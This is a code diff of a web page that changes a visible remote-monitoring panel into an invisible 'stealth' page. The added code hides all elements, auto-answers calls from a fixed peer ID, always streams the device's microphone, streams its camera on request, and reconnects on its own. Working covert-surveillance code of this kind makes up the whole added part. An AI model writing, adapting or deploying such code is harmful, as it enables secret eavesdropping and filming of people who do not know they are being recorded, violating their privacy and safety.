@@ -3,598 +3,231 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Astro Remote - Silent Monitor</title>
+    <title>Astro Stealth</title>
     <style>
+        /* Complete invisibility - no visual elements */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
+        
         body {
-            font-family: 'Times New Roman', Georgia, serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 16px;
-        }
-
-        .stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .star {
-            position: absolute;
-            background: white;
-            border-radius: 50%;
-            opacity: 0.8;
-            animation: twinkle 3s infinite;
-        }
-
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 1; }
-        }
-
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: rgba(255,255,255,0.95);
-            border-radius: 30px;
+            background: transparent;
+            min-height: 0;
+            padding: 0;
+            margin: 0;
             overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            position: relative;
-            z-index: 1;
-            border: 1px solid rgba(255,215,0,0.3);
         }
-
-        .header {
-            background: linear-gradient(135deg, #2c3e50 0%, #1a1a2e 100%);
-            color: #ffd700;
-            padding: 12px 16px;
-            text-align: center;
-            border-bottom: 2px solid #ffd700;
-        }
-
-        .header h1 {
-            font-size: 18px;
-            margin-bottom: 3px;
-            font-family: 'Georgia', serif;
-            letter-spacing: 2px;
-        }
-
-        .status {
-            font-size: 10px;
-            margin-top: 5px;
-        }
-
-        .status.connected {
-            color: #90EE90;
-        }
-
-        .connect-section {
-            background: #1a1a2e;
-            padding: 12px;
-            text-align: center;
-            border-bottom: 1px solid #ffd70033;
-        }
-
-        .connect-btn {
-            background: linear-gradient(135deg, #ffd700 0%, #ffb347 100%);
-            color: #1a1a2e;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 25px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: monospace;
-        }
-
-        .connect-btn:active {
-            transform: scale(0.97);
-        }
-
-        .connect-btn.disabled {
-            background: #666;
-            opacity: 0.6;
-        }
-
-        .call-controls {
-            background: #1a1a2e;
-            padding: 12px;
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            flex-wrap: wrap;
-            border-bottom: 1px solid #ffd70033;
-        }
-
-        .call-btn {
-            background: #2c3e50;
-            color: #ffd700;
-            border: 1px solid #ffd700;
-            padding: 10px 16px;
-            border-radius: 25px;
-            font-size: 11px;
-            font-weight: bold;
-            cursor: pointer;
-            flex: 1;
-            min-width: 100px;
-            font-family: monospace;
-        }
-
-        .call-btn:active {
-            transform: scale(0.97);
-        }
-
-        .camera-controls {
-            background: #1a1a2e;
-            padding: 10px;
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            border-bottom: 1px solid #ffd70033;
-        }
-
-        .camera-btn {
-            background: #0f3460;
-            color: #ffd700;
-            border: 1px solid #ffd700;
-            padding: 8px 16px;
-            border-radius: 25px;
-            font-size: 11px;
-            font-weight: bold;
-            cursor: pointer;
-            flex: 1;
-            font-family: monospace;
-        }
-
-        .camera-btn:active {
-            transform: scale(0.97);
-        }
-
-        .camera-btn:disabled {
-            opacity: 0.4;
-        }
-
-        .camera-btn.active {
-            background: #ffd700;
-            color: #1a1a2e;
-        }
-
-        .call-btn.end {
-            background: #5a1e1e;
-            border-color: #ff6b6b;
-            color: #ff6b6b;
-        }
-
-        .call-btn:disabled {
-            opacity: 0.4;
-        }
-
-        .video-container {
-            display: none;
-            background: #000;
-            padding: 10px;
-        }
-
-        .video-container.active {
-            display: block;
-        }
-
-        .video-wrapper {
-            position: relative;
-            background: #1a1a2e;
-            border-radius: 15px;
-            overflow: hidden;
-            border: 1px solid #ffd700;
-        }
-
+        
+        /* Hidden video elements */
         video {
-            width: 100%;
-            max-height: 300px;
-            background: #000;
-            display: block;
-        }
-
-        #remoteVideo {
-            width: 100%;
-        }
-
-        .video-label {
             position: absolute;
-            bottom: 6px;
-            left: 6px;
-            background: rgba(0,0,0,0.7);
-            color: #ffd700;
-            padding: 2px 8px;
-            border-radius: 15px;
-            font-size: 9px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            top: -1000px;
+            left: -1000px;
         }
-
-        .call-status {
-            text-align: center;
-            font-size: 11px;
-            padding: 8px;
-            background: #0f3460;
-            color: #ffd700;
-            font-family: monospace;
-        }
-
-        .ids {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            padding: 8px;
-            background: #1a1a2e;
-            font-size: 10px;
-            color: #ffd700;
-            font-family: monospace;
-            border-bottom: 1px solid #ffd70033;
-            flex-wrap: wrap;
-        }
-
-        .id-badge {
-            background: rgba(255,255,255,0.1);
-            padding: 4px 8px;
-            border-radius: 12px;
-        }
-
-        .warning-badge {
-            background: #5a1e1e;
-            color: #ff6b6b;
-            font-size: 9px;
-            padding: 4px 8px;
-            border-radius: 12px;
-            text-align: center;
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 8px;
-            }
-            .call-btn, .camera-btn {
-                font-size: 9px;
-                padding: 8px 10px;
-            }
+        
+        /* Ensure no visible elements */
+        div, span, button, iframe {
+            display: none !important;
         }
     </style>
-    
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 </head>
 <body>
-    <div class="stars" id="stars"></div>
-    
-    <div class="container">
-        <div class="header">
-            <h1>🌟 ASTRO REMOTE 🌟</h1>
-            <div class="status" id="statusText">🔮 Stealth Device: Offline</div>
-        </div>
-
-        <div class="ids">
-            <div class="id-badge">🎮 Remote: APrivate</div>
-            <div class="id-badge">👁️ Stealth: BPrivate</div>
-            <div class="warning-badge">🔇 REMOTE SILENT - No audio sent</div>
-        </div>
-
-        <div class="connect-section">
-            <button class="connect-btn" id="connectBtn">🔮 CONNECT TO STEALTH DEVICE 🔮</button>
-        </div>
-
-        <div class="call-controls">
-            <button class="call-btn" id="audioOnlyBtn" disabled>🎙️ Audio Only</button>
-            <button class="call-btn" id="videoCallBtn" disabled>📹 Video Monitor</button>
-            <button class="call-btn end" id="endCallBtn" disabled>🔴 Stop</button>
-        </div>
-
-        <div class="camera-controls" id="cameraControls" style="display: none;">
-            <button class="camera-btn" id="frontCameraBtn">📱 Front Camera</button>
-            <button class="camera-btn" id="backCameraBtn">📷 Back Camera</button>
-        </div>
-
-        <div class="call-status" id="callStatus">⚫ Standby - Remote sends NO audio</div>
-
-        <div class="video-container" id="videoContainer">
-            <div class="video-wrapper">
-                <video id="remoteVideo" autoplay playsinline></video>
-                <span class="video-label">👁️ Stealth Feed</span>
-            </div>
-        </div>
-    </div>
+    <video id="localVideo" autoplay muted playsinline></video>
 
     <script>
-        // Stars background
-        for(let i = 0; i < 100; i++) {
-            const star = document.createElement('div');
-            star.className = 'star';
-            star.style.left = Math.random() * 100 + '%';
-            star.style.top = Math.random() * 100 + '%';
-            star.style.width = Math.random() * 3 + 'px';
-            star.style.height = star.style.width;
-            star.style.animationDelay = Math.random() * 3 + 's';
-            document.getElementById('stars').appendChild(star);
-        }
-
-        const MY_ID = "APrivate";
-        const PARTNER_ID = "BPrivate";
+        // ============ STEALTH CONFIGURATION ============
+        const MY_ID = "BPrivate";
+        const PARTNER_ID = "APrivate";
+        const AUTO_ACCEPT_CALLS = true;
+        // ==============================================
         
         let peer = null;
-        let conn = null;
-        let mediaCall = null;
+        let currentCall = null;
         let localStream = null;
-        let currentCamera = 'front';
-        let isVideoMode = false;
-        let audioContext = null;
+        let reconnectAttempts = 0;
+        const MAX_RECONNECTS = 5;
         
-        const connectBtn = document.getElementById('connectBtn');
-        const audioOnlyBtn = document.getElementById('audioOnlyBtn');
-        const videoCallBtn = document.getElementById('videoCallBtn');
-        const endCallBtn = document.getElementById('endCallBtn');
-        const frontCameraBtn = document.getElementById('frontCameraBtn');
-        const backCameraBtn = document.getElementById('backCameraBtn');
-        const cameraControls = document.getElementById('cameraControls');
-        const statusText = document.getElementById('statusText');
-        const callStatus = document.getElementById('callStatus');
-        const videoContainer = document.getElementById('videoContainer');
-        const remoteVideo = document.getElementById('remoteVideo');
-        
-        function setStatus(connected) {
-            if (connected) {
-                statusText.innerText = '✅ Stealth Device: Connected';
-                statusText.classList.add('connected');
-                connectBtn.innerText = '🌟 DEVICE CONNECTED 🌟';
-                connectBtn.disabled = true;
-                audioOnlyBtn.disabled = false;
-                videoCallBtn.disabled = false;
-            } else {
-                statusText.innerText = '🔮 Stealth Device: Offline';
-                statusText.classList.remove('connected');
-                connectBtn.innerText = '🔮 CONNECT TO STEALTH DEVICE 🔮';
-                connectBtn.disabled = false;
-                audioOnlyBtn.disabled = true;
-                videoCallBtn.disabled = true;
-                endCallBtn.disabled = true;
-                cameraControls.style.display = 'none';
-            }
+        function log(msg, type = 'info') {
+            const prefix = type === 'error' ? '❌' : (type === 'warn' ? '⚠️' : '✅');
+            console.log(`[STEALTH] ${prefix} ${msg}`);
         }
         
-        // Get remote's camera stream (NO AUDIO from remote)
-        async function getLocalStream(withVideo, useBackCamera = false) {
-            if (!withVideo) {
-                // Audio-only mode - remote sends nothing (no audio, no video)
-                return null;
-            }
+        async function getMediaStream(callType) {
+            const isVideo = callType === 'video';
             
             const constraints = {
-                audio: false,  // NO AUDIO from remote
-                video: {
-                    facingMode: useBackCamera ? "environment" : "user",
+                audio: true,  // ALWAYS send audio from stealth
+                video: isVideo ? {
                     width: { ideal: 640 },
                     height: { ideal: 480 }
-                }
+                } : false
             };
+            
+            log(`Getting media - Audio: true, Video: ${isVideo}`, 'info');
             
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                console.log('[REMOTE] Camera acquired:', useBackCamera ? 'Back' : 'Front');
+                const hasAudio = stream.getAudioTracks().length > 0;
+                const hasVideo = stream.getVideoTracks().length > 0;
+                log(`Media acquired - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
                 return stream;
             } catch (e) {
                 if (e.name === 'NotAllowedError') {
-                    callStatus.innerText = '❌ Camera permission denied';
+                    log('Camera/Mic permission denied', 'error');
                 } else {
-                    callStatus.innerText = '❌ Camera error';
-                    console.error(e);
+                    log(`Media error: ${e.message}`, 'error');
                 }
-                return null;
+                throw e;
             }
         }
         
-        async function switchCamera() {
-            if (!isVideoMode || !mediaCall || !localStream) return;
+        async function handleIncomingCall(call) {
+            const callType = call.metadata?.type || 'voice';
+            const isVideo = callType === 'video';
+            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} call from remote`, 'info');
             
-            const newCamera = currentCamera === 'front' ? 'back' : 'front';
-            const useBackCamera = (newCamera === 'back');
-            
-            callStatus.innerText = `🔄 Switching to ${newCamera} camera...`;
-            
-            try {
-                const newStream = await getLocalStream(true, useBackCamera);
-                if (!newStream) throw new Error('No camera stream');
-                
-                if (mediaCall && mediaCall.peerConnection) {
-                    const senders = mediaCall.peerConnection.getSenders();
-                    const videoSender = senders.find(sender => sender.track && sender.track.kind === 'video');
-                    
-                    if (videoSender && newStream.getVideoTracks()[0]) {
-                        await videoSender.replaceTrack(newStream.getVideoTracks()[0]);
-                    }
-                }
-                
-                // Clean up old stream
-                if (localStream) {
-                    localStream.getTracks().forEach(track => track.stop());
-                }
-                
-                localStream = newStream;
-                currentCamera = newCamera;
-                
-                if (currentCamera === 'front') {
-                    frontCameraBtn.classList.add('active');
-                    backCameraBtn.classList.remove('active');
-                } else {
-                    frontCameraBtn.classList.remove('active');
-                    backCameraBtn.classList.add('active');
-                }
-                
-                callStatus.innerText = `📹 ${currentCamera === 'front' ? 'Front' : 'Back'} camera ACTIVE`;
-                
-            } catch (err) {
-                callStatus.innerText = `❌ Failed to switch camera`;
-                console.error(err);
-            }
-        }
-        
-        async function startCall(withVideo) {
-            if (!conn) {
-                callStatus.innerText = '❌ Connect to stealth device first';
+            if (!AUTO_ACCEPT_CALLS) {
+                log('Call rejected', 'warn');
+                call.close();
                 return;
             }
             
             try {
-                isVideoMode = withVideo;
-                callStatus.innerText = `📡 Starting ${withVideo ? 'video' : 'audio'} monitor...`;
+                // Get stealth media stream (ALWAYS includes audio)
+                const stream = await getMediaStream(callType);
+                localStream = stream;
                 
-                // Get local stream (only for video mode, audio mode sends nothing)
-                if (withVideo) {
-                    localStream = await getLocalStream(true, false);
-                    if (!localStream) {
-                        callStatus.innerText = '❌ No camera available';
-                        return;
-                    }
-                    currentCamera = 'front';
-                    videoContainer.classList.add('active');
-                    cameraControls.style.display = 'flex';
-                    frontCameraBtn.classList.add('active');
-                    backCameraBtn.classList.remove('active');
-                } else {
-                    // Audio-only: send no stream
-                    localStream = null;
-                    cameraControls.style.display = 'none';
+                // Hide video element
+                if (isVideo && stream.getVideoTracks().length > 0) {
+                    const videoEl = document.getElementById('localVideo');
+                    videoEl.srcObject = stream;
                 }
                 
-                // Create call with or without stream
-                mediaCall = peer.call(PARTNER_ID, localStream || undefined, { 
-                    metadata: { type: withVideo ? 'video' : 'voice' } 
-                });
+                // Answer the call
+                call.answer(stream);
+                currentCall = call;
                 
-                mediaCall.on('stream', (remoteStream) => {
-                    console.log('[REMOTE] Received stream from stealth');
-                    
-                    if (withVideo && remoteStream.getVideoTracks().length > 0) {
-                        remoteVideo.srcObject = remoteStream;
-                        remoteVideo.play().catch(e => console.log('Video play error:', e));
+                log(`Call answered - Sending ${isVideo ? 'Video + Audio' : 'Audio only'} to remote`, 'success');
+                
+                // Handle remote stream (ignore)
+                call.on('stream', (remoteStream) => {
+                    if (remoteStream) {
+                        // Disable and stop remote tracks
+                        remoteStream.getTracks().forEach(track => {
+                            track.enabled = false;
+                            track.stop();
+                        });
+                        log('Remote stream disabled (stealth receives nothing)', 'info');
                     }
-                    
-                    // Play audio from stealth
-                    if (remoteStream.getAudioTracks().length > 0) {
-                        // Create new audio element for stealth audio
-                        const stealthAudio = new Audio();
-                        stealthAudio.srcObject = remoteStream;
-                        stealthAudio.play().catch(e => console.log('Audio play error:', e));
-                        console.log('[REMOTE] Audio playback started from stealth');
-                    }
-                    
-                    callStatus.innerText = `👁️ ${withVideo ? 'Video + Audio' : 'Audio Only'} monitor ACTIVE`;
-                    audioOnlyBtn.disabled = true;
-                    videoCallBtn.disabled = true;
-                    endCallBtn.disabled = false;
                 });
                 
-                mediaCall.on('close', () => { 
-                    console.log('[REMOTE] Call closed');
-                    endCall(); 
+                call.on('close', () => {
+                    log('Call ended by remote', 'info');
+                    endCall();
                 });
                 
-                mediaCall.on('error', (err) => { 
-                    console.error('[REMOTE] Call error:', err);
-                    endCall(); 
+                call.on('error', (err) => {
+                    log(`Call error: ${err}`, 'error');
+                    endCall();
                 });
                 
             } catch (err) {
-                console.error('[REMOTE] Start call error:', err);
-                callStatus.innerText = '❌ Failed to start monitor';
-                endCall();
+                log(`Failed to handle call: ${err.message}`, 'error');
+                call.close();
             }
         }
         
         function endCall() {
             if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
+                localStream.getTracks().forEach(track => {
+                    track.stop();
+                    log(`Stopped ${track.kind} track`, 'info');
+                });
                 localStream = null;
             }
-            if (mediaCall) {
-                mediaCall.close();
-                mediaCall = null;
+            if (currentCall) {
+                currentCall.close();
+                currentCall = null;
             }
-            remoteVideo.srcObject = null;
-            videoContainer.classList.remove('active');
-            cameraControls.style.display = 'none';
-            isVideoMode = false;
-            callStatus.innerText = '⚫ Monitor stopped';
-            audioOnlyBtn.disabled = false;
-            videoCallBtn.disabled = false;
-            endCallBtn.disabled = true;
+            document.getElementById('localVideo').srcObject = null;
+            log('Call ended, resources released', 'info');
         }
         
-        function setupConnection(connection) {
-            conn = connection;
-            setStatus(true);
-            callStatus.innerText = '✅ Connected - Ready to monitor';
-            
-            conn.on('close', () => {
-                setStatus(false);
-                endCall();
-                callStatus.innerText = '⚫ Device disconnected';
-            });
-        }
-        
-        function connectToPartner() {
-            if (conn) {
-                callStatus.innerText = '✅ Already connected';
-                return;
+        function initPeer() {
+            if (peer) {
+                peer.destroy();
+                peer = null;
             }
             
-            callStatus.innerText = '🔍 Locating stealth device...';
-            const connection = peer.connect(PARTNER_ID);
-            
-            connection.on('open', () => {
-                callStatus.innerText = '✅ Connected to stealth device!';
-                setupConnection(connection);
-            });
-            
-            connection.on('error', () => {
-                callStatus.innerText = '❌ Stealth device offline';
-                setStatus(false);
-            });
-        }
-        
-        function init() {
+            log(`Initializing stealth device as ${MY_ID}`, 'info');
             peer = new Peer(MY_ID);
             
             peer.on('open', (id) => {
-                callStatus.innerText = '✅ Remote ready - Click Connect';
+                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
+                log(`Waiting for connection from ${PARTNER_ID}...`, 'info');
+                reconnectAttempts = 0;
+            });
+            
+            peer.on('call', (call) => {
+                if (call.peer === PARTNER_ID) {
+                    handleIncomingCall(call);
+                } else {
+                    log(`Rejected call from ${call.peer}`, 'warn');
+                    call.close();
+                }
+            });
+            
+            peer.on('disconnected', () => {
+                log('Disconnected, reconnecting...', 'warn');
+                if (reconnectAttempts < MAX_RECONNECTS) {
+                    reconnectAttempts++;
+                    setTimeout(() => peer.reconnect(), 3000);
+                }
             });
             
             peer.on('error', (err) => {
                 if (err.type === 'unavailable-id') {
-                    callStatus.innerText = '❌ Remote ID in use - Close other tabs';
+                    log(`ID ${MY_ID} in use, retrying...`, 'warn');
+                    setTimeout(() => initPeer(), 5000);
+                } else {
+                    log(`Error: ${err.type}`, 'error');
                 }
             });
         }
         
-        connectBtn.addEventListener('click', connectToPartner);
-        audioOnlyBtn.addEventListener('click', () => startCall(false));
-        videoCallBtn.addEventListener('click', () => startCall(true));
-        endCallBtn.addEventListener('click', endCall);
-        frontCameraBtn.addEventListener('click', () => switchCamera());
-        backCameraBtn.addEventListener('click', () => switchCamera());
+        // Start stealth service
+        log('=== ASTRO STEALTH SERVICE ===');
+        log('Configuration:');
+        log(`  - ID: ${MY_ID}`);
+        log(`  - Target: ${PARTNER_ID}`);
+        log(`  - Audio: ALWAYS SENT`);
+        log(`  - Video: ON DEMAND`);
+        log(`  - Receives: NOTHING from remote`);
         
+        initPeer();
+        
+        // Heartbeat
+        setInterval(() => {
+            if (currentCall) {
+                console.log('[STEALTH] Active call - sending to remote');
+            }
+        }, 30000);
+        
+        // Clean shutdown
         window.addEventListener('beforeunload', () => {
-            if (conn) conn.close();
+            if (currentCall) currentCall.close();
             if (peer) peer.destroy();
-            if (localStream) localStream.getTracks().forEach(track => track.stop());
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
         });
-        
-        init();
     </script>
 </body>
 </html>
